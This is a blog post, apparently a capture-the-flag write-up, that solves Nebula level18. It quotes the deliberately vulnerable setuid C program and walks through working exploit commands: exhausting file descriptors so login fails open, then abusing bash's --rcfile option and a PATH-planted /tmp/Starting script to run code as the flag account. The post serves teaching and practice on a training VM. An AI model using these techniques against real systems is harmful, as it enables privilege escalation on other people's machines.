@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Nebula level18 write-up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="In Level 18 we are given the code of a vulnerable program:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;getopt.h&amp;gt; struct { FILE *debugfile; int verbose; int loggedin; } globals; #define dprintf(...) if(globals.debugfile) \ fprintf(globals.debugfile, __VA_ARGS__) #define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \ fprintf(globals.debugfile, __VA_ARGS__) #define PWFILE &amp;quot;/home/flag18/password&amp;quot; void login(char *pw) { FILE *fp; fp = fopen(PWFILE, &amp;quot;r&amp;quot;); if(fp) { char file[64]; if(fgets(file, sizeof(file) - 1, fp) == NULL) { dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE); return; } fclose(fp); if(strcmp(pw, file) !">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Nebula level18 write-up">
+    <meta name="twitter:description" content="In Level 18 we are given the code of a vulnerable program:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;getopt.h&amp;gt; struct { FILE *debugfile; int verbose; int loggedin; } globals; #define dprintf(...) if(globals.debugfile) \ fprintf(globals.debugfile, __VA_ARGS__) #define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \ fprintf(globals.debugfile, __VA_ARGS__) #define PWFILE &amp;quot;/home/flag18/password&amp;quot; void login(char *pw) { FILE *fp; fp = fopen(PWFILE, &amp;quot;r&amp;quot;); if(fp) { char file[64]; if(fgets(file, sizeof(file) - 1, fp) == NULL) { dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE); return; } fclose(fp); if(strcmp(pw, file) !">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Nebula level18 write-up">
+  <meta property="og:description" content="In Level 18 we are given the code of a vulnerable program:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;getopt.h&amp;gt; struct { FILE *debugfile; int verbose; int loggedin; } globals; #define dprintf(...) if(globals.debugfile) \ fprintf(globals.debugfile, __VA_ARGS__) #define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \ fprintf(globals.debugfile, __VA_ARGS__) #define PWFILE &amp;quot;/home/flag18/password&amp;quot; void login(char *pw) { FILE *fp; fp = fopen(PWFILE, &amp;quot;r&amp;quot;); if(fp) { char file[64]; if(fgets(file, sizeof(file) - 1, fp) == NULL) { dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE); return; } fclose(fp); if(strcmp(pw, file) !">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/11/27/nebula-level18-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/11/27/nebula-level18-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Nebula level18 write-up</h1>
+      <p class="post-meta">@pwntester · Nov 27, 2013 · 8 min read</p>
+    </header>
+    <article class="post-content">
+
+<p>In <a href="http://exploit-exercises.com/nebula/level18">Level 18</a> we are given the code of a vulnerable program:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;getopt.h&gt;
+
+struct {
+  FILE *debugfile;
+  int verbose;
+  int loggedin;
+} globals;
+
+#define dprintf(...) if(globals.debugfile) \
+  fprintf(globals.debugfile, __VA_ARGS__)
+#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \
+  fprintf(globals.debugfile, __VA_ARGS__)
+
+#define PWFILE &quot;/home/flag18/password&quot;
+
+void login(char *pw)
+{
+  FILE *fp;
+
+  fp = fopen(PWFILE, &quot;r&quot;);
+  if(fp) {
+    char file[64];
+
+    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
+      dprintf(&quot;Unable to read password file %s\n&quot;, PWFILE);
+      return;
+    }
+                fclose(fp);
+    if(strcmp(pw, file) != 0) return;
+  }
+  dprintf(&quot;logged in successfully (with%s password file)\n&quot;,
+    fp == NULL ? &quot;out&quot; : &quot;&quot;);
+
+  globals.loggedin = 1;
+
+}
+
+void notsupported(char *what)
+{
+  char *buffer = NULL;
+  asprintf(&amp;buffer, &quot;--&gt; [%s] is unsupported at this current time.\n&quot;, what);
+  dprintf(what);
+  free(buffer);
+}
+
+void setuser(char *user)
+{
+  char msg[128];
+
+  sprintf(msg, &quot;unable to set user to '%s' -- not supported.\n&quot;, user);
+  printf(&quot;%s\n&quot;, msg);
+
+}
+
+int main(int argc, char **argv, char **envp)
+{
+  char c;
+
+  while((c = getopt(argc, argv, &quot;d:v&quot;)) != -1) {
+    switch(c) {
+      case 'd':
+        globals.debugfile = fopen(optarg, &quot;w+&quot;);
+        if(globals.debugfile == NULL) err(1, &quot;Unable to open %s&quot;, optarg);
+        setvbuf(globals.debugfile, NULL, _IONBF, 0);
+        break;
+      case 'v':
+        globals.verbose++;
+        break;
+    }
+  }
+
+  dprintf(&quot;Starting up. Verbose level = %d\n&quot;, globals.verbose);
+
+  setresgid(getegid(), getegid(), getegid());
+  setresuid(geteuid(), geteuid(), geteuid());
+
+  while(1) {
+    char line[256];
+    char *p, *q;
+
+    q = fgets(line, sizeof(line)-1, stdin);
+    if(q == NULL) break;
+    p = strchr(line, '\n'); if(p) *p = 0;
+    p = strchr(line, '\r'); if(p) *p = 0;
+
+    dvprintf(2, &quot;got [%s] as input\n&quot;, line);
+
+    if(strncmp(line, &quot;login&quot;, 5) == 0) {
+      dvprintf(3, &quot;attempting to login\n&quot;);
+      login(line + 6);
+    } else if(strncmp(line, &quot;logout&quot;, 6) == 0) {
+      globals.loggedin = 0;
+    } else if(strncmp(line, &quot;shell&quot;, 5) == 0) {
+      dvprintf(3, &quot;attempting to start shell\n&quot;);
+      if(globals.loggedin) {
+        execve(&quot;/bin/sh&quot;, argv, envp);
+        err(1, &quot;unable to execve&quot;);
+      }
+      dprintf(&quot;Permission denied\n&quot;);
+    } else if(strncmp(line, &quot;logout&quot;, 4) == 0) {
+      globals.loggedin = 0;
+    } else if(strncmp(line, &quot;closelog&quot;, 8) == 0) {
+      if(globals.debugfile) fclose(globals.debugfile);
+      globals.debugfile = NULL;
+    } else if(strncmp(line, &quot;site exec&quot;, 9) == 0) {
+      notsupported(line + 10);
+    } else if(strncmp(line, &quot;setuser&quot;, 7) == 0) {
+      setuser(line + 8);
+    }
+  }
+
+  return 0;
+}
+
+</code></pre>
+
+<p>After reading it and playing around with it here is the basic functionality:</p>
+
+<p>When started, the program looks for two arguments:
+ -d file: to enable logging to the provided log file
+ -v: to increase the verbosity level</p>
+
+<p>Then the program starts and write the verbosity level to the debug file and sets the EUID privileges to the binary. The program starts accepting input at that time:</p>
+
+<ul>
+<li><p>login <name>: tries to log in the given user. The <strong>login</strong> function fails open, that means that if the password file cannot be read, then it logs in the user. We could try to remove the password file to force <strong>fopen</strong> to fail and return <strong>NULL</strong> file descriptor, but we cannot remove the file. The other way to make the <strong>fopen</strong> function call to fail it to exhaust the file descriptors so that there are no more to assign to the <strong>password</strong> file. This can be done since the <strong>login</strong> function never closes the file descriptor. This one way we will explore, lets keep on reading the program.</p></li>
+
+<li><p>logout: just clear the <strong>globals.loggedin</strong> flag which is of no utility for us</p></li>
+
+<li><p>shell: this looks pretty useful for us, it executes a new <strong>/bin/sh</strong> shell (note the absolute path, so we wont be able to fake it) and uses the same <strong>flag18</strong> arguments as the shell arguments.</p></li>
+
+<li><p>closelog: if <strong>flag18</strong> was called with the -d option, it closes the log file descriptor and stops logging. This will be useful, but keep reading</p></li>
+
+<li><p>site exec: calls the <strong>notsupported</strong> function where there is a format string vulnerability (<strong>dprintf(what)</strong>). But if we try to exploit it we get:</p>
+
+<pre><code class="language-lang-bash">level18@nebula:~$ /home/flag18/flag18 -v -d /tmp/log
+site exec %n
+* %n in writable segment detected *
+Aborted
+</code></pre></li>
+
+<li><p>Googling for it takes us to the <a href="http://www.phrack.org/issues.html?issue=67&amp;id=9">Phrack</a> magazine pointing out that the binary was compiled with FORTIFY_SOURCE that provides two countermeasures against format strings.</p>
+
+<ul>
+<li>Format strings containing the %n specifier may not be located at a writeable address in the memory space of the application.</li>
+<li>When using positional parameters, all arguments within the range must be consumed. So to use %7$x, you must also use 1,2,3,4,5 and 6.</li>
+</ul></li>
+
+<li><p>We can verify it with <strong>checksec.sh</strong>:</p>
+
+<pre><code class="language-lang-bash">level18@nebula:~$ ./checksec.sh --fortify-file /home/flag18/flag18
+* FORTIFY_SOURCE support available (libc)    : Yes
+* Binary compiled with FORTIFY_SOURCE support: Yes
+</code></pre></li>
+
+<li><p>So exploiting this path looks hard and requires skills I still dont have ;-)</p></li>
+
+<li><p>setuser: calls the setuser function where our input line (up to 256 bytes) is stored in the msg buffer (128 bytes) so there is a clear buffer overflow but it looks like the binary is compiled with some protections in place:</p>
+
+<pre><code class="language-lang-bash">level18@nebula:~$ echo &quot;setuser `python -c 'print(&quot;A&quot;*200)'`&quot; | /home/flag18/flag18 -v -d /tmp/log
+*** buffer overflow detected ***: /home/flag18/flag18 terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x3d98d5]
+/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0x3d86d7]
+/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0x3d7d35]
+/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0x35df91]
+/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0x335305]
+/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0x3d7e09]
+/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0x3d7d1f]
+/home/flag18/flag18[0x8048df5]
+/home/flag18/flag18[0x8048b1b]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x30b113]
+/home/flag18/flag18[0x8048bb1]
+======= Memory map: ========
+002f2000-00468000 r-xp 00000000 08:01 69         /lib/i386-linux-gnu/libc-2.13.so
+00468000-0046a000 r--p 00176000 08:01 69         /lib/i386-linux-gnu/libc-2.13.so
+0046a000-0046b000 rw-p 00178000 08:01 69         /lib/i386-linux-gnu/libc-2.13.so
+0046b000-0046e000 rw-p 00000000 00:00 0
+00bd5000-00bf3000 r-xp 00000000 08:01 66         /lib/i386-linux-gnu/ld-2.13.so
+00bf3000-00bf4000 r--p 0001d000 08:01 66         /lib/i386-linux-gnu/ld-2.13.so
+00bf4000-00bf5000 rw-p 0001e000 08:01 66         /lib/i386-linux-gnu/ld-2.13.so
+00c99000-00cb5000 r-xp 00000000 08:01 91         /lib/i386-linux-gnu/libgcc_s.so.1
+00cb5000-00cb6000 r--p 0001b000 08:01 91         /lib/i386-linux-gnu/libgcc_s.so.1
+00cb6000-00cb7000 rw-p 0001c000 08:01 91         /lib/i386-linux-gnu/libgcc_s.so.1
+00cba000-00cbb000 r-xp 00000000 00:00 0          [vdso]
+08048000-0804a000 r-xp 00000000 08:01 132987     /home/flag18/flag18
+0804a000-0804b000 r--p 00001000 08:01 132987     /home/flag18/flag18
+0804b000-0804c000 rw-p 00002000 08:01 132987     /home/flag18/flag18
+0808c000-080ad000 rw-p 00000000 00:00 0          [heap]
+b771c000-b771d000 rw-p 00000000 00:00 0
+b7721000-b7724000 rw-p 00000000 00:00 0
+bf9b9000-bf9da000 rw-p 00000000 00:00 0          [stack]
+Aborted
+</code></pre></li>
+</ul>
+
+<p>Checking the binary protections shows little chance of success:</p>
+
+<pre><code class="language-lang-bash"> level18@nebula:~$ ./checksec.sh --file ../flag18/flag18
+ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+ Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ../flag18/flag18
+</code></pre>
+
+<p>So thats all, there are no more options and we need to take one of this exploitation techniques. I will choose the easy one (exhausting the file descriptors) as the other two are far beyond my current skills.</p>
+
+<h1 id="exploiting-the-file-logic-flaw">Exploiting the file logic flaw</h1>
+
+<p>Ok, so first we need to know how many file descriptors can be opened by a process:</p>
+
+<pre><code class="language-lang-bash">level18@nebula:~$ ulimit -a
+core file size          (blocks, -c) 0
+data seg size           (kbytes, -d) unlimited
+scheduling priority             (-e) 0
+file size               (blocks, -f) unlimited
+pending signals                 (-i) 1839
+max locked memory       (kbytes, -l) 64
+max memory size         (kbytes, -m) unlimited
+open files                      (-n) 1024
+pipe size            (512 bytes, -p) 8
+POSIX message queues     (bytes, -q) 819200
+real-time priority              (-r) 0
+stack size              (kbytes, -s) 8192
+cpu time               (seconds, -t) unlimited
+max user processes              (-u) 1839
+virtual memory          (kbytes, -v) unlimited
+file locks                      (-x) unlimited
+</code></pre>
+
+<p>Nice 1024, so when the program starts it take 3 for the stdin, stdout and stderr, we need to take 1021 more fds before the <strong>fopen</strong> fails and we are logged in:</p>
+
+<pre><code class="language-lang-bash">level18@nebula:~$ echo &quot;`python -c 'print(&quot;login me\n&quot;*1021 + &quot;shell&quot;)'`&quot; | /home/flag18/flag18 -v -d /tmp/log
+/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
+</code></pre>
+
+<p>Opps, we take all of the fds so our shell is refusing to run because it cannot open <strong>libncurses.so.5</strong>. Note than since we are running <strong>/bin/sh</strong> with the flag18 arguments (including binary name as arg 0) the error message looks like coming from flag18 when its actually coming from /bin/sh</p>
+
+<p>Ok, remember that there was an option to close the log file and free its fd?? lets use it:</p>
+
+<pre><code class="language-lang-bash">level18@nebula:~$ echo &quot;`python -c 'print(&quot;login me\n&quot;*1021 + &quot;closelog\n&quot; + &quot;shell&quot;)'`&quot; | /home/flag18/flag18 -v -d /tmp/log
+/home/flag18/flag18: -d: invalid option
+Usage:	/home/flag18/flag18 [GNU long option] [option] ...
+	/home/flag18/flag18 [GNU long option] [option] script-file ...
+GNU long options:
+	--debug
+	--debugger
+	--dump-po-strings
+	--dump-strings
+	--help
+	--init-file
+	--login
+	--noediting
+	--noprofile
+	--norc
+	--posix
+	--protected
+	--rcfile
+	--restricted
+	--verbose
+	--version
+Shell options:
+	-irsD or -c command or -O shopt_option		(invocation only)
+	-abefhkmnptuvxBCHP or -o option
+</code></pre>
+
+<p>Well, new problem arises, <strong>/bin/sh</strong> does not have any <strong>-d</strong> argument. I got stuck here so I looked for some help and was pointed to the <strong>bash</strong> man page and its <strong>&ndash;rcfile</strong> option:</p>
+
+<blockquote>
+<p>The &ndash;rcfile file option will force Bash to read and execute commands from file instead of ~/.bashrc.</p>
+</blockquote>
+
+<p>Ok, so there we go:</p>
+
+<pre><code class="language-lang-bash">level18@nebula:~$ echo &quot;`python -c 'print(&quot;login me\n&quot;*1021 + &quot;closelog\n&quot; + &quot;shell&quot;)'`&quot; | /home/flag18/flag18 --rcfile -d /tmp/log
+/home/flag18/flag18: invalid option -- '-'
+/home/flag18/flag18: invalid option -- 'r'
+/home/flag18/flag18: invalid option -- 'c'
+/home/flag18/flag18: invalid option -- 'f'
+/home/flag18/flag18: invalid option -- 'i'
+/home/flag18/flag18: invalid option -- 'l'
+/home/flag18/flag18: invalid option -- 'e'
+/tmp/log: line 1: Starting: command not found
+/tmp/log: line 2: syntax error near unexpected token `('
+/tmp/log: line 2: `logged in successfully (without password file)'
+</code></pre>
+
+<p>Ok, it worked!!! but our rc file is now the log file and so, its trying to execute its contents and thats why it fails executing <strong>Starting</strong>, all we need to do is create an executable called after <strong>Starting</strong> with our payload:</p>
+
+<pre><code class="language-lang-bash">level18@nebula:~$ echo &quot;getflag&quot; &gt; /tmp/Starting
+level18@nebula:~$ chmod +x /tmp/Starting
+level18@nebula:~$ export PATH=/tmp:$PATH
+level18@nebula:~$ echo &quot;`python -c 'print(&quot;login me\n&quot;*1021 + &quot;closelog\n&quot; + &quot;shell&quot;)'`&quot; | /home/flag18/flag18 --rcfile -d /tmp/log
+/home/flag18/flag18: invalid option -- '-'
+/home/flag18/flag18: invalid option -- 'r'
+/home/flag18/flag18: invalid option -- 'c'
+/home/flag18/flag18: invalid option -- 'f'
+/home/flag18/flag18: invalid option -- 'i'
+/home/flag18/flag18: invalid option -- 'l'
+/home/flag18/flag18: invalid option -- 'e'
+You have successfully executed getflag on a target account
+/tmp/log: line 2: syntax error near unexpected token `('
+/tmp/log: line 2: `logged in successfully (without password file)'
+</code></pre>
+
+<p>Voila !!!</p>
+
+<p>I google around for solutions to the format string and buffer overflow approaches and found these ones that I need to re-read when I grow up :D</p>
+
+<ul>
+<li><a href="http://v0ids3curity.blogspot.com.es/2012/09/exploit-exercise-format-string.html">v0id s3curity - Exploit Exercise - Format String FORTIFY_SOURCE Bypass </a></li>
+<li><a href="http://v0ids3curity.blogspot.com.es/2012/09/defeating-aslr-using-information-leak.html">v0id s3curity - Defeating ASLR Using Information Leak </a></li>
+<li><a href="http://forelsec.blogspot.com.es/2013/03/nebula-solutions-all-levels.html">forelsket &amp; security - Level 18</a></li>
+</ul>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/nebula18"><span class="tag">Nebula18</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2157</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
